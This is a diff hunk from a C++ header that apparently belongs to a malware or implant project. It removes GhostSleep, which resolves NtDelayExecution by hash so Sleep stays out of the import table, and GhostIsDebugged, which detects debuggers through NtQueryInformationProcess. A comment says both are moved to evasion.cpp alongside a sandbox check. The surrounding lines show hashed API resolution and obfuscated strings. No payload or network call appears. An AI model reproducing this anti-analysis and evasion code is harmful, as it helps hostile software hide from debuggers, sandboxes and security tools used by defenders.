@@ -129,35 +129,7 @@ inline FARPROC HashProc(HMODULE hMod, uint32_t targetHash) {
 #define HASHPROC(mod, name) \
     reinterpret_cast<decltype(&name)>(HashProc((mod), FNV(#name)))
 
-// ─── NtDelayExecution helper (no Sleep in IAT) ──────────────────────────────
-// Resolves NtDelayExecution via hash on first call; falls back to Sleep.
-inline void GhostSleep(DWORD milliseconds) {
-    typedef NTSTATUS (NTAPI *pfnNtDelay_t)(BOOLEAN, PLARGE_INTEGER);
-    static pfnNtDelay_t pfn = nullptr;
-    if (!pfn) {
-        static auto hNt = GetModuleHandleA(XS("ntdll.dll"));
-        pfn = reinterpret_cast<pfnNtDelay_t>(HashProc(hNt, FNV("NtDelayExecution")));
-    }
-    if (pfn) {
-        LARGE_INTEGER li;
-        li.QuadPart = -static_cast<LONGLONG>(milliseconds) * 10000LL;
-        pfn(FALSE, &li);
-    } else {
-        ::Sleep(milliseconds);
-    }
-}
-
-// ─── NtQueryInformationProcess debugger check (replaces IsDebuggerPresent) ──
-inline BOOL GhostIsDebugged() {
-    typedef NTSTATUS (NTAPI *pfnNtQIP_t)(HANDLE, ULONG, PVOID, ULONG, PULONG);
-    static pfnNtQIP_t pfn = nullptr;
-    if (!pfn) {
-        static auto hNt = GetModuleHandleA(XS("ntdll.dll"));
-        pfn = reinterpret_cast<pfnNtQIP_t>(HashProc(hNt, FNV("NtQueryInformationProcess")));
-    }
-    if (!pfn) return FALSE;
-    ULONG_PTR debugPort = 0;
-    // ProcessDebugPort = 7
-    pfn(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), nullptr);
-    return (debugPort != 0);
-}
+// ─── NOTE ────────────────────────────────────────────────────────────────────
+// GhostSleep is defined as a static function in evasion.cpp (owns the cached
+// pfnNtDelay pointer). GhostIsDebugged is in evasion.cpp via SandboxCheck.
+// Do NOT redeclare them here — same-TU include would cause redefinition errors.
